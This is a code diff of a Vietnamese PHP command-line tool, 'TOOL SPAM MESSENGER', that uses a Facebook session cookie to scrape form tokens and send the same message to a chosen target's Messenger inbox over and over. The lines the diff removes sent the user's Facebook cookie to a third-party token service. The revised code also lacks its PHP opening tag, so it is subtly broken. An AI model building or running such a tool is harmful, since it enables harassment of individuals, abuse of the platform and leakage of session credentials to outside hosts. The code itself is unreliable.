@@ -1,4 +1,7 @@
-<?php
+/***
+Bản Quyền Của An Orin, Dec Được Bán Thì Nhớ Ghi Bản Quyền Em Ý Thức Là Do Mình Thanks!!
+***/
+@system("clear");
 error_reporting(0);
 session_start();
 date_default_timezone_set('Asia/Ho_Chi_Minh');
@@ -10,34 +13,27 @@ $vang = "\033[1;33m";
 $xduong = "\033[1;34m";
 $hong = "\033[1;35m";
 $trang = "\033[1;37m";
-$cyan= "\e[1;36m";
+$whiteb="\033[1;37m";
+$red="\033[0;31m";
+$redb="\033[1;31m";
+/***[ USERAGENT ]***/
+$useragent = "Mozilla/5.0 (Linux; Android 10; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.1.4638.51 Mobile Safari/537.36";
 /***[ Đánh Dấu Bản Quyền ]***/
-$thanh_xau= $do."[" . $trang . "=.=" . $do . "] ".$trang."=> ";
-$thanh_dep= $do."[" . $trang . "=.=" . $do . "] ".$trang."=> ";
-$thanh = $trang."➩ ";
-$vinh = $trang."\033[1;37m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
-$ip = file_get_contents("https://vtoolvip.tk/ip.php");
-$useragent = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36';
-$_SESSION['US_SPAM_MESS'] = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36";
-/***[ Time ]***/
-$today= date('d-m-y');
-$a = date("d"); 
-$b = date("m"); 
-$c = date("Y");
-$ngay = date("d"); 
-$thang = date("m"); 
-$nam = date("Y");
-$day= date('d-m-y');
-$d = date("d-m");
-$weekday = date("l");
+$ndp_tool = $do."[".$trang ."=.=".$do."] ".$trang."=> ";
+$dp = $do."[".$trang ."=.=".$do."] ";
+/***[ Delay ]***/
+if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') {
+    $_SESSION['load'] = 1200;
+    $_SESSION['delay'] = 2000;
+} else {
+    $_SESSION['load'] = 0;
+    $_SESSION['delay'] = 1000;
+}
+/***[ Config ]***/
+$_SESSION['version'] = "9.5";
+$_SESSION['shop'] = "ShopDucPhat.Tk";
+$dem = 0;
 /***[ Banner ]***/
-$thuong = $do."[".$luc."●".$do."]".$trang." => ";
-$thanhngang = $vang."-------------------------------------------------------------\n";
-$weekday = date("l"); 
-$ngay = date("d"); 
-$thang = date("m"); 
-$nam = date("Y"); 
-$weekday = strtolower($weekday);switch($weekday) { case 'monday': $weekday = "\033[1;33mThứ\033[1;36m 2"; break; case 'tuesday': $weekday = "\033[1;33mThứ\033[1;36m 3"; break; case 'wednesday': $weekday = "\033[1;33mThứ \033[1;36m4"; break; case 'thursday': $weekday = "\033[1;33mThứ \033[1;36m5"; break; case 'friday': $weekday = "\033[1;33mThứ\033[1;36m 6"; break; case 'saturday': $weekday = "\033[1;33mThứ \033[1;36m7"; break; default: $weekday = "\033[1;33mCN"; break; }
 $banner = "
 \033[1;34m  █████╗ ███╗   ██╗     ██████╗ ██████╗ ██╗███╗   ██╗
 \033[1;37m ██╔══██╗████╗  ██║    ██╔═══██╗██╔══██╗██║████╗  ██║
@@ -46,164 +42,157 @@ $banner = "
 \033[1;34m ██║  ██║██║ ╚████║    ╚██████╔╝██║  ██║██║██║ ╚████║
 \033[1;37m ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
 \033[1;31m────────────────────────────────────────────────────────────
-\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;33mTOOL SPAM MESSAGE \033[1;37mV2
+\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;33mTOOL SPAM MESSENGER
 \033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;35mADMIN: \033[1;36mAN ORIN
-\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;36mFB: \033[1;31manorintool
+\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;36mFB: \033[1;31manorintool970
 \033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mBOX SUPPORT: \033[1;37mhttps://zalo.me/g/dpfbxq529
-\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;34mYOUTUBE: \033[1;37mhttps://youtube.com/@AnOrinTool403
+\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;34mYOUTUBE: \033[1;37mhttps://youtube.com/@AnOrinTool970
 \033[1;31m────────────────────────────────────────────────────────────\n";
 /***[ Clear + Thông Số Admin ]***/
-    while(true){
-   system('clear');
-   echo $banner;
-        if(file_exists("NinjaMess.txt")){
-            system('clear');
-            echo $banner;
-            echo $thanh_dep.$luc."Nhập ".$do."[".$trang."1".$do."]".$luc." Sử Dụng Cookie Cũ\n";
-            echo $thanh_dep.$luc."Nhập ".$do."[".$trang."2".$do."]".$luc." Sử Dụng Cookie Mới\n";
-            echo $thanh_dep.$luc."Nhập số: " . $vang;
-            $_SESSION['nhapcc'] = trim(fgets(STDIN));
-         if ($_SESSION['nhapcc'] == 1){
-         	echo $xnhac."Đang Lấy Dữ Liệu Cũ...\n";
-         	sleep(2);
-         	break;
-         } else {
-                unlink("NinjaMess.txt");
-            }
-        } else {
-        echo $thanh_dep.$luc."Nhập Cookie Facebook: ".$vang;
-        $_SESSION['CK_SPAM_MESS'] = trim(fgets(STDIN));        
-		$token_me =  file_get_contents("https://vuabuff.com/api/token/EAAG.php?cookie=".urlencode($_SESSION['CK_SPAM_MESS'])."&2fa=".$haifa);
-        $k = fopen("NinjaMess.txt","w+");
-        fwrite($k, $_SESSION['CK_SPAM_MESS']."\n".$_SESSION['US_SPAM_MESS']);
-        fclose($k);
-        break;
-        }
-    }
-  
-    system('clear');
-    echo $banner;
-    $read = file("NinjaMess.txt",FILE_IGNORE_NEW_LINES);
-    $_SESSION['CK_SPAM_MESS'] = $read[0];
-    $_SESSION['US_SPAM_MESS'] = $read[1];
-    $_SESSION['HD_SPAM_MESS'] = array(
-        "Cookie:".$_SESSION['CK_SPAM_MESS'],
-        "Host:mbasic.facebook.com",
-        "user-agent:".$_SESSION['US_SPAM_MESS'],
-        "sec-fetch-site:same-origin",
-        "sec-fetch-mode:navigate",
-        "sec-fetch-user:?1",
-        "sec-fetch-dest:document",
-        "upgrade-insecure-requests:1");
-        fopen("idlink.txt","w+");
-    $_SESSION['DATA_SPAM_MESS'] = getallspam($thanh,$thanh_dep, $do, $trang, $luc, $vinh);
-    system('clear');
-    echo $banner;
-    echo $thanh.$do."Lưu Ý:$luc Nhập Có Dấu Sẽ Bị Lõi Font Chữ \n";
-    echo $thanh_dep.$luc."Nhập Nội Dung Spam: $vang";
-    $_SESSION['ND_SPAM_MESS'] = trim(fgets(STDIN));
-    echo $vinh;
-    echo $thanh_dep.$luc."Nhập Delay: ".$vang;
-    $delay = trim(fgets(STDIN));
-    $sl = 0;
-echo $thanh_dep.$luc. "Nhập Số Lượng :\033[1;93m ";
+spam_message($banner, $ndp_tool);
+echo $ndp_tool.$luc."Vui Lòng Nhập Cookie Facebook".$trang.":".$vang." ";
+$cookie = trim(fgets(STDIN));
+# ========= [ API CHECK INFO ]  ========= 
+$checklive = thongtin($cookie);
+if ($checklive == "die"){
+	echo $ndp_tool.$do."Có Vẻ Cookie Bạn Đã Die!!\n"; die;
+} else {
+    $tenfb = $checklive['name'];
+    $idfb = $checklive['id'];
+}
+@system('clear');
+spam_message($banner, $ndp_tool);
+echo $ndp_tool.$luc."Nhập ID Facebook Người Muốn Spam".$trang.":".$vang." ";
+$idspam = trim(fgets(STDIN));
+echo "\e[1;37m".str_repeat('= ', 35)."\n";
+echo $ndp_tool.$luc."Vui Lòng Nhập Delay Spam".$trang.":".$vang." ";
+$timedelay = trim(fgets(STDIN));
+echo "\e[1;37m".str_repeat('= ', 35)."\n";
+echo $ndp_tool.$luc."Vui Lòng Nhập Nội Dung Bạn Muốn Spam".$trang.":".$vang." ";
+$noidung = trim(fgets(STDIN));
+echo $ndp_tool.$luc."Bạn Muốn Spam Bao Nhiêu Lần Thì Dừng Tool".$trang.":".$vang." ";
 $dungtool = trim(fgets(STDIN));
-    system('clear');
-    echo $banner;
-    $dem=0;
-    while(true){    
-    $data_1 = $_SESSION['DATA_SPAM_MESS'];
-    $data_1 = str_replace("<NDSEND>", $_SESSION['ND_SPAM_MESS'],$data_1);
-    $data_1 = str_replace("<DEM>", $dem_stt_messs,$data_1);
-    $nd_messs = str_replace("<DEM>", $dem_stt_messs,$_SESSION['ND_SPAM_MESS']);
-    $_SESSION['ND_SPAM_MESS1'] = $nd_messs;
-    $curl = curl_init();
-    curl_setopt_array($curl, array(
-    CURLOPT_PORT => "443",
-    CURLOPT_URL => "https://mbasic.facebook.com/messages/send/?icm=1&refid=12",
-    CURLOPT_ENCODING => "",
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_CUSTOMREQUEST => "POST",
-    CURLOPT_POSTFIELDS => $data_1,
-    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
-    $x = curl_exec($curl); curl_close($curl);
-        $dem++;
-echo "\033[1;34m[\033[1;33m".$dem."\033[1;34m]\e[1;32m⌠\e[1;33mVựa Buff\e[1;32m⌡\033[1;91m ● \033[1;36m".date("H:i:s")."\033[1;31m ● \033[1;".rand(31,37)."m"." SPAM-MESS \033[1;31m ● \033[1;37m".$_SESSION['ND_SPAM_MESS1']." \n";
-$sl++;
-		if ($sl < $dungtool){
-	delay($delay);
-		} else {
-                echo "\n".$thanh_dep."\033[1;32mĐã Hoàn Tất                                                          \r\n";
-			die();
-		}
-    }
-function getallspam($thanh,$thanh_dep, $do, $trang, $luc, $vinh){
-    $curl = curl_init();
-    curl_setopt_array($curl, array(
-    CURLOPT_PORT => "443",
-    CURLOPT_URL => "https://mbasic.facebook.com/messages/?ref_component=mbasic_home_header&ref_page=MMessagingThreadlistController&refid=11",
-    CURLOPT_ENCODING => "",
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_CUSTOMREQUEST => "GET",
-    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
-    $x = curl_exec($curl); curl_close($curl);
-    if(strpos($x, "/messages/read/?")){
-    for($i=1;$i<50;$i++){
-    $getinfo = explode("<img",explode('/messages/read/?',$x)[$i])[0]; 
-    if($getinfo ==! ""){
-    $getname = explode("<",explode(">",$getinfo)[1])[0];
-    echo $thanh.$do."[".$trang.$i.$do."]"."\033[1;".rand(31,37)."m ".$getname."\n";
-    $getidlink = explode("#fua",$getinfo)[0];
-    $aslink = "/messages/read/?".$getidlink;
-    $k = fopen("idlink.txt","a");
-    fwrite($k, $aslink."\n");
-    fclose($k);
-    }else{break;}
-    }
-    }else{echo "Cookie Die";exit;}
-    while(true){
-    	echo $vinh;
-    echo $thanh_dep.$luc."Nhập Lựa Chọn Người Muốn Spam: $vang";
-    $acc = trim(fgets(STDIN));
-    if(is_numeric($acc)){
-    $line = file("idlink.txt", FILE_IGNORE_NEW_LINES);
-    $acc--;
-    global $asslink;
-    global $csid;
-    $asslink = $line[$acc];
-    break;}else{echo "Chỉ Nhập Số"."\n";}
-    } 	
-    $curl = curl_init();
-    curl_setopt_array($curl, array(
-    CURLOPT_PORT => "443",
-    CURLOPT_URL => "https://mbasic.facebook.com".$asslink,
-    CURLOPT_ENCODING => "",
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_CUSTOMREQUEST => "GET",
-    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
-    $x = curl_exec($curl); curl_close($curl);
-    for($t=1;$t<20;$t++){
-    $d1 = explode(">",explode('<input type="hidden"',$x)[$t])[0];
-    $getd = explode('"',explode('value="',$d1)[1])[0];
-    if(strpos($d1, "fb_dtsg")){$fb_dtsg=$getd;}
-    if(strpos($d1, "jazoest")){$jazoest=$getd;}
-    if(strpos($d1, "tids")){$tids=$getd;}
-    if(strpos($d1, "wwwupp")){$wwwupp=$getd;}
-    if(strpos($d1, "ids")){$ids=$getd;}
-    if(strpos($d1, "cver")){$cver=$getd;}
-    if(strpos($d1, "csid")){$csid=$getd;break;}
-    }
-    $data = "fb_dtsg=".$fb_dtsg."&jazoest=".$jazoest."&body=<NDSEND>&send=Gửi&tids=".$tids."&wwwupp=".$wwwupp."&ids[".$ids."]=".$ids."&referrer=&ctype=&cver=".$cver."&csid=".$csid;
-    return $data;
+echo "\e[1;37m".str_repeat('= ', 35)."\n";
+echo $vang."ID FB: ".$luc.$idfb.$do." | ".$vang."Tên FB: ".$luc.$tenfb."".$luc."\n";
+echo "\e[1;37m".str_repeat('= ', 35)."\n";
+while (true){
+# =========== [ GET FB_DTSG + JAZOEST ] =========== 
+	$header = array( 
+	'host:mbasic.facebook.com',
+	'referer:https://mbasic.facebook.com/'.$idspam.'?_rdr',
+	'sec-ch-ua:"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+	'sec-ch-ua-mobile:?0',
+	'sec-ch-ua-platform:"Windows"',
+	'sec-fetch-dest:document',
+	'sec-fetch-mode:navigate',
+	'sec-fetch-site:same-origin',
+	'sec-fetch-user:?1',
+	'upgrade-insecure-requests:1',
+	'user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
+	'cookie: '.$cookie.'',
+	);
+	$mr = curl_init();
+	curl_setopt($mr, CURLOPT_URL, 'https://mbasic.facebook.com/messages/read/?fbid='.$idspam.'&entrypoint=profile_message_button&_rdr');
+	curl_setopt($mr, CURLOPT_RETURNTRANSFER, TRUE);
+	curl_setopt($mr, CURLOPT_CUSTOMREQUEST, 'GET');
+	curl_setopt($mr, CURLOPT_COOKIEFILE, 'file.txt');
+	curl_setopt($mr, CURLOPT_HTTPHEADER, $header);
+	curl_setopt($mr, CURLOPT_USERAGENT, $useragent);
+	$mr2 = curl_exec($mr); 
+	curl_close($mr); 
+	# TÁCH
+	$fb_dtsg = explode('" autocomplete="off" />',explode('<input type="hidden" name="fb_dtsg" value="',$mr2)[1])[0];
+	$jazoest = explode('" autocomplete="off" />',explode('<input type="hidden" name="jazoest" value="',$mr2)[1])[0];
+# =========== [ BẮT ĐẦU CHAT ] =========== 
+	$header = array( 
+	'host:m.facebook.com',
+	'origin:https://m.facebook.com',
+	'referer:https://m.facebook.com/messages/t/'.$idspam.'/',
+	'sec-ch-ua:"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+	'sec-ch-ua-mobile:?0',
+	'sec-ch-ua-platform:"Windows"',
+	'sec-fetch-dest:empty',
+	'sec-fetch-mode:cors',
+	'sec-fetch-site:same-origin',
+	'user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
+	'x-fb-lsd:hEaJzkj73xojygYcQ3Q0UW',
+	'x-msgr-region:PNB',
+	'x-requested-with:XMLHttpRequest',
+	'x-response-format:JSONStream',
+	'cookie: '.$cookie.'',
+	);
+	$data = 'ids%5B'.$idspam.'%5D='.$idspam.'&body='.$noidung.'&waterfall_source=message&fb_dtsg='.$fb_dtsg.'&jazoest='.$jazoest.'&lsd=hEaJzkj73xojygYcQ3Q0UW';
+	$mr = curl_init();
+	curl_setopt($mr, CURLOPT_URL, 'https://m.facebook.com/messages/send/');
+	curl_setopt($mr, CURLOPT_RETURNTRANSFER, TRUE);
+	curl_setopt($mr, CURLOPT_COOKIEFILE, 'file.txt');
+	curl_setopt($mr, CURLOPT_POSTFIELDS, $data);
+	curl_setopt($mr, CURLOPT_HTTPHEADER, $header);
+	curl_setopt($mr, CURLOPT_USERAGENT, $useragent);
+	$mr2 = curl_exec($mr); 
+	curl_close($mr); 
+# =========== [ ĐẾM + TIME + NỘI DUNG ] =========== 
+	$dem++;
+	$time = date("H:i:s");
+	echo "".$do."[".$vang.$dem.$do."] ".$do."| ".$xnhac.$time.$do." | ".$vang."SUCCESS".$do." | ".$trang.$idspam.$do." | ".$vang.$noidung."\n";
+	delay($timedelay);
+if ($dem >= $dungtool){
+        echo "\e[1;37m".str_repeat('= ', 35)."\n";
+echo $ndp_tool.$luc."Đã Hoàn Thành \033[1;93m".$dem."\033[1;92m Lần Spam\n";
+echo $ndp_tool.$luc."Cảm Ơn Bạn Đã Sử Dụng Tool ".$trang."AuTo Spam Message".$luc." Của ".$trang."NguyenDucPhat\n";
+        echo "\e[1;37m".str_repeat('= ', 35)."\n";exit;
 }
-function delay ($delay){
-        for($tt = $delay ;$tt>= 1;$tt--){
-        echo "\r\033[1;33m   An Orin \033[1;31m | $tt | "; usleep(150000);
-        echo "\r\033[1;31m   An Orin \033[0;31m | $tt | "; usleep(150000);
-        echo "\r\033[1;32m   An Orin \033[0;31m | $tt | "; usleep(150000);
-        echo "\r\033[1;34m   An Orin \033[0;31m | $tt | "; usleep(150000);
-        echo "\r\033[1;35m   An Orin \033[0;31m | $tt | "; usleep(150000);
-        echo "\r\033[1;35m   An Orin \033[0;31m | $tt | "; usleep(150000);
-        echo "\r\033[1;35m   An Orin \033[0;31m | $tt | "; usleep(150000);}
+} #đóng while
+# =========== [ FUNCTION ] =========== 
+function thongtin($cookie) {
+    $ch = curl_init();
+    $header = array(
+        "Host:m.facebook.com",
+        "user-agent:Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
+        "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "cookie:$cookie",
+    );
+    $linkbv = 'https://m.facebook.com/me/about';
+    curl_setopt($ch, CURLOPT_URL, $linkbv);
+    $head[] = "Connection: keep-alive";
+    $head[] = "Keep-Alive: 300";
+    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
+    $head[] = "Accept-Language: en-us,en;q=0.5";
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
+    curl_setopt($ch, CURLOPT_ENCODING, '');
+    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
+    :'));
+    $page = curl_exec($ch);
+    $page1 = json_decode($page);
+    $tenfb = explode('<', explode('>', explode('</span>', explode('<span>', $page)[2])[0])[1])[0];
+    $idfb = explode('%',explode('?lst=', $page)[1])[0];
+    if ($idfb == '') {
+	return "die";
+    }
+    return ["id" => $idfb, "name" => $tenfb];
+}
+function delay($delay){
+	/* Copyright © 2024 - 2025 : An Orin */
+    $trang = "\033[1;37m";
+    for($ndp = $delay ;$ndp>= 1;$ndp--){
+echo "\r\033[1;33m   An Orin \033[1;31m | $ndp | "; usleep(150000);
+echo "\r\033[1;31m   An Orin \033[0;31m | $ndp | "; usleep(150000);
+echo "\r\033[1;32m   An Orin \033[0;31m | $ndp | "; usleep(150000);
+echo "\r\033[1;34m   An Orin \033[0;31m | $ndp | "; usleep(150000);
+echo "\r\033[1;35m   An Orin \033[0;31m | $ndp | "; usleep(150000);
+echo "\r\033[1;35m   An Orin \033[0;31m | $ndp | "; usleep(150000);
+echo "\r\033[1;35m   An Orin \033[0;31m | $ndp | "; usleep(150000);}
+}
 echo "\r\e[1;95m    ⚡ An Orin ⚡                       \r";
-}
+function spam_message($banner, $ndp_tool){
+	/* Copyright © 2024 - 2025 : An Orin */
+    for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep($_SESSION['load']);}
+	    }
